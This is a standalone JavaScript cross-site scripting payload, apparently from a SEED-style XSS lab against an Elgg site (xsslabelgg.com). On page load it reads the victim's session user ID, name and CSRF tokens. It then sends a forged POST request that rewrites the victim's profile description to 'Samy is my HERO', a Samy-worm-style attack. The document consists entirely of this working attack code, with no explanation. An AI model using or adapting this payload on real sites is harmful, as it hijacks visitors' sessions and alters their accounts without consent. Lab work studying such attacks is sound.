<script type="text/javascript">
window.onload = function() {
    var guid = elgg.session.user.guid;
    var name = elgg.session.user.name;
    
    var desc = "Samy is my HERO (added by Zane and Suraj)";
    
    var content = "__elgg_token=" + elgg.security.token.__elgg_token +
                  "&__elgg_ts=" + elgg.security.token.__elgg_ts +
                  "&name=" + encodeURIComponent(name) +
                  "&description=" + encodeURIComponent(desc) +
                  "&guid=" + guid;
    
    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
    
    var Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
}
</script>
